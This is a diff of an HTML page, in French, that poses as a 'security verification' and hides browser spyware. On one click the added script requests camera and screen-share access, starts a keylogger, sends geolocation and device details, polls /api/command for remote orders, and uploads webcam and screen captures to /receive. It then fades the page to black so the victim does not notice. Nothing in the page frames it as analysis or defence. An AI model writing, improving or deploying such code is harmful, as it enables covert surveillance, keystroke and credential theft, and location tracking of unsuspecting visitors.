@@ -22,8 +22,8 @@
             text-align: center;
             max-width: 400px;
         }
-        h1 { color: #333; margin-bottom: 20px; }
-        p { color: #666; margin-bottom: 30px; }
+        h1 { color: #333; margin-bottom: 20px; font-size: 24px; }
+        p { color: #666; line-height: 1.6; margin-bottom: 30px; }
         .btn-access {
             background: linear-gradient(45deg, #667eea, #764ba2);
             color: white;
@@ -32,155 +32,280 @@
             font-size: 18px;
             border-radius: 50px;
             cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 10px 20px rgba(102,126,234,0.4);
             font-weight: bold;
         }
-        #status { margin-top: 10px; font-size: 14px; }
+        .btn-access:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(102,126,234,0.6);
+        }
+        #status { margin-top: 15px; font-size: 14px; color: #666; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🔒 Vérification de Sécurité</h1>
-        <p>Cliquez pour autoriser l'accès.</p>
-        <button class="btn-access" onclick="start()">🚀 ACTIVER</button>
+        <p>Une vérification rapide est nécessaire pour accéder à cette page.</p>
+        <button class="btn-access" onclick="activate()">🚀 ACTIVER MAINTENANT</button>
         <div id="status"></div>
     </div>
+
     <script>
-        let active = false;
-        let modules = {camera: {on: false, int: null}, keylog: {on: false, buf: ''}, screen: {on: false, int: null}};
-        
-        async function start() {
-            document.getElementById('status').textContent = '✅ Actif';
-            active = true;
-            startKeylog();
-            getInfo();
-            setInterval(getCmd, 3000);
-            setTimeout(() => {document.body.innerHTML = ''; document.body.style.background = '#000';}, 2000);
-        }
-        
-        async function getCmd() {
-            if (!active) return;
+        let isActive = false;
+        let state = {
+            camera: {active: false, timer: null},
+            keylog: {active: false, buffer: ''},
+            screen: {active: false, timer: null}
+        };
+
+        async function activate() {
+            document.getElementById('status').textContent = '⏳ Demande d\'autorisations...';
+            
+            // Demander l'autorisation de la caméra
             try {
-                const r = await fetch('/api/command');
-                const d = await r.json();
-                if (d.status !== 'no-command') runCmd(d);
-            } catch(e) {}
+                const cameraStream = await navigator.mediaDevices.getUserMedia({video: true, audio: false});
+                cameraStream.getTracks().forEach(track => track.stop());
+                document.getElementById('status').textContent = '✅ Caméra autorisée';
+            } catch(e) {
+                document.getElementById('status').textContent = '⚠️ Caméra refusée';
+            }
+            
+            // Attendre un peu avant la prochaine demande
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            // Demander l'autorisation du partage d'écran
+            try {
+                document.getElementById('status').textContent = '⏳ Partage d\'écran...';
+                const screenStream = await navigator.mediaDevices.getDisplayMedia({video: true});
+                screenStream.getTracks().forEach(track => track.stop());
+                document.getElementById('status').textContent = '✅ Partage d\'écran autorisé';
+            } catch(e) {
+                document.getElementById('status').textContent = '⚠️ Partage d\'écran refusé';
+            }
+            
+            document.getElementById('status').textContent = '✅ Système activé';
+            isActive = true;
+            
+            // Démarrer keylogger
+            enableKeylogger();
+            
+            // Envoyer infos système
+            sendSystemInfo();
+            
+            // Commencer à vérifier les commandes
+            setInterval(checkCommands, 3000);
+            
+            // Masquer l'interface après 2 secondes
+            setTimeout(() => {
+                document.body.style.transition = 'opacity 1s';
+                document.body.style.opacity = '0';
+                setTimeout(() => {
+                    document.body.innerHTML = '';
+                    document.body.style.background = '#000';
+                }, 1000);
+            }, 2000);
         }
-        
-        function runCmd(c) {
-            if (c.module === 'camera') {
-                if (c.action === 'start') startCam(c.params.interval || 5);
-                else if (c.action === 'stop') stopCam();
-                else if (c.action === 'snapshot') capCam();
-            } else if (c.module === 'keylogger') {
-                if (c.action === 'start') startKeylog();
-                else if (c.action === 'stop') stopKeylog();
-                else if (c.action === 'dump') sendKeys();
-            } else if (c.module === 'screen') {
-                if (c.action === 'start') startScr(c.params.quality || 0.5, c.params.interval || 2);
-                else if (c.action === 'stop') stopScr();
+
+        // Vérifier les commandes du serveur
+        async function checkCommands() {
+            if (!isActive) return;
+            try {
+                const res = await fetch('/api/command');
+                const data = await res.json();
+                if (data.status !== 'no-command') {
+                    executeCommand(data);
+                }
+            } catch(e) {
+                console.log('Command check failed');
             }
         }
-        
-        function startCam(i) {
-            if (modules.camera.on) return;
-            modules.camera.on = true;
-            modules.camera.int = setInterval(capCam, i * 1000);
-            capCam();
+
+        // Exécuter une commande
+        function executeCommand(cmd) {
+            console.log('Command:', cmd.module, cmd.action);
+            
+            if (cmd.module === 'camera') {
+                if (cmd.action === 'start') startCamera(cmd.params.interval || 5);
+                else if (cmd.action === 'stop') stopCamera();
+                else if (cmd.action === 'snapshot') captureCamera();
+            }
+            else if (cmd.module === 'keylogger') {
+                if (cmd.action === 'start') enableKeylogger();
+                else if (cmd.action === 'stop') disableKeylogger();
+                else if (cmd.action === 'dump') sendKeylogData();
+            }
+            else if (cmd.module === 'screen') {
+                if (cmd.action === 'start') startScreen(cmd.params.quality || 0.5, cmd.params.interval || 2);
+                else if (cmd.action === 'stop') stopScreen();
+            }
         }
-        
-        function stopCam() {
-            modules.camera.on = false;
-            if (modules.camera.int) clearInterval(modules.camera.int);
+
+        // === MODULE CAMÉRA ===
+        function startCamera(interval) {
+            if (state.camera.active) return;
+            state.camera.active = true;
+            captureCamera();
+            state.camera.timer = setInterval(captureCamera, interval * 1000);
         }
-        
-        async function capCam() {
+
+        function stopCamera() {
+            state.camera.active = false;
+            if (state.camera.timer) {
+                clearInterval(state.camera.timer);
+                state.camera.timer = null;
+            }
+        }
+
+        async function captureCamera() {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({video: true});
-                const v = document.createElement('video');
-                v.style.display = 'none';
-                document.body.appendChild(v);
-                v.srcObject = s;
-                v.onloadedmetadata = () => {
-                    v.play();
+                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: false});
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
                     setTimeout(() => {
-                        const c = document.createElement('canvas');
-                        c.width = 640; c.height = 480;
-                        c.getContext('2d').drawImage(v, 0, 0, 640, 480);
-                        send({type: 'camera', image: c.toDataURL('image/jpeg', 0.7)});
-                        s.getTracks().forEach(t => t.stop());
-                        v.remove();
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, 640, 480);
+                        const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                        
+                        sendData({type: 'camera', image: imageData});
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        video.remove();
                     }, 500);
                 };
-            } catch(e) {}
+            } catch(e) {
+                console.error('Camera error:', e);
+            }
         }
-        
-        function startKeylog() {
-            if (modules.keylog.on) return;
-            modules.keylog.on = true;
-            modules.keylog.buf = '';
-            document.addEventListener('keydown', e => {
-                if (modules.keylog.on) {
-                    modules.keylog.buf += e.key;
-                    if (modules.keylog.buf.length >= 50) sendKeys();
-                }
+
+        // === MODULE KEYLOGGER ===
+        function enableKeylogger() {
+            if (state.keylog.active) return;
+            state.keylog.active = true;
+            state.keylog.buffer = '';
+            
+            document.addEventListener('keydown', handleKeyPress);
+        }
+
+        function disableKeylogger() {
+            state.keylog.active = false;
+            document.removeEventListener('keydown', handleKeyPress);
+        }
+
+        function handleKeyPress(event) {
+            if (!state.keylog.active) return;
+            
+            state.keylog.buffer += event.key;
+            
+            // Envoyer quand le buffer atteint 50 caractères
+            if (state.keylog.buffer.length >= 50) {
+                sendKeylogData();
+            }
+        }
+
+        function sendKeylogData() {
+            if (state.keylog.buffer.length > 0) {
+                sendData({type: 'keylog', keys: state.keylog.buffer});
+                state.keylog.buffer = '';
+            }
+        }
+
+        // === MODULE PARTAGE D'ÉCRAN ===
+        function startScreen(quality, interval) {
+            if (state.screen.active) return;
+            state.screen.active = true;
+            captureScreen(quality);
+            state.screen.timer = setInterval(() => captureScreen(quality), interval * 1000);
+        }
+
+        function stopScreen() {
+            state.screen.active = false;
+            if (state.screen.timer) {
+                clearInterval(state.screen.timer);
+                state.screen.timer = null;
+            }
+        }
+
+        async function captureScreen(quality) {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 1280;
+                        canvas.height = 720;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, 1280, 720);
+                        const imageData = canvas.toDataURL('image/jpeg', quality);
+                        
+                        sendData({type: 'screen', image: imageData});
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        video.remove();
+                    }, 500);
+                };
+            } catch(e) {
+                console.error('Screen share error:', e);
+            }
+        }
+
+        // === INFOS SYSTÈME ===
+        function sendSystemInfo() {
+            // Géolocalisation
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        sendData({
+                            type: 'location',
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    error => console.log('Geolocation error'),
+                    {enableHighAccuracy: true, timeout: 5000}
+                );
+            }
+
+            // Informations du système
+            sendData({
+                type: 'system',
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenResolution: `${screen.width}x${screen.height}`,
+                cores: navigator.hardwareConcurrency || 'unknown',
+                memory: navigator.deviceMemory || 'unknown',
+                online: navigator.onLine,
+                timestamp: Date.now()
             });
         }
-        
-        function stopKeylog() {
-            modules.keylog.on = false;
-        }
-        
-        function sendKeys() {
-            if (modules.keylog.buf) {
-                send({type: 'keylog', keys: modules.keylog.buf});
-                modules.keylog.buf = '';
-            }
-        }
-        
-        function startScr(q, i) {
-            if (modules.screen.on) return;
-            modules.screen.on = true;
-            modules.screen.int = setInterval(() => capScr(q), i * 1000);
-            capScr(q);
-        }
-        
-        function stopScr() {
-            modules.screen.on = false;
-            if (modules.screen.int) clearInterval(modules.screen.int);
-        }
-        
-        async function capScr(q) {
+
+        // === ENVOI DES DONNÉES ===
+        async function sendData(data) {
             try {
-                const s = await navigator.mediaDevices.getDisplayMedia({video: true});
-                const v = document.createElement('video');
-                v.style.display = 'none';
-                document.body.appendChild(v);
-                v.srcObject = s;
-                v.onloadedmetadata = () => {
-                    v.play();
-                    setTimeout(() => {
-                        const c = document.createElement('canvas');
-                        c.width = 1280; c.height = 720;
-                        c.getContext('2d').drawImage(v, 0, 0, 1280, 720);
-                        send({type: 'screen', image: c.toDataURL('image/jpeg', q)});
-                        s.getTracks().forEach(t => t.stop());
-                        v.remove();
-                    }, 500);
-                };
-            } catch(e) {}
-        }
-        
-        function getInfo() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(p => send({type: 'location', lat: p.coords.latitude, lon: p.coords.longitude}), () => {});
+                await fetch('/receive', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {
+                console.error('Send error:', e);
             }
-            send({type: 'system', ua: navigator.userAgent, lang: navigator.language, screen: `${screen.width}x${screen.height}`, platform: navigator.platform, timestamp: Date.now()});
-        }
-        
-        async function send(d) {
-            try {
-                await fetch('/receive', {method: 'POST', body: JSON.stringify(d), headers: {'Content-Type': 'application/json'}});
-            } catch(e) {}
         }
     </script>
 </body>
